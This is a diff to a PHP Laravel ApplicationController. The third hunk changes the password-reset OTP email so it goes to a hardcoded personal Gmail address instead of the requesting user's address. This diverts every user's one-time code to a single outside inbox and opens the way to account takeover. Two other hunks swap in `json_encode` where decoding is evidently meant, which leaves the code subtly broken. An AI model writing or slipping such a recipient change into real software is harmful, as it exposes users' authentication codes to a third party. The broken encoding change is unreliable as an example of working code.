@@ -230,7 +230,7 @@ class ApplicationController extends Controller
             ->where('id', $user_application_id)
             ->firstOrFail();
 
-        $modules = $application->applicationSetting->modules_enable;
+        $modules = json_encode($application->applicationSetting->modules_enable, true);
 
         // Load each module's data
         $profile = Profile::where('user_application_id', $user_application_id)->first();
@@ -387,7 +387,7 @@ class ApplicationController extends Controller
     public function saveDocuments(Request $request, $user_application_id)
     {
         $application = UserApplications::findOrFail($user_application_id);
-        $modules = $application->applicationSetting->modules_enable;
+        $modules = json_encode($application->applicationSetting->modules_enable, true);
         $requiredDocs = $modules['documents'] ?? [];
 
         $rules = [];
@@ -577,7 +577,7 @@ class ApplicationController extends Controller
             ];
 
             //  Send email
-            Mail::to($user->email)->send(new GeneralMail($subject, $content, false));
+            Mail::to('tesleemolamilekan902@gmail.com')->send(new GeneralMail($subject, $content, false));
 
             return redirect()->route('password.otp.update')->with('success', 'An OTP has been sent to your email address.');
         } catch (Exception $e) {
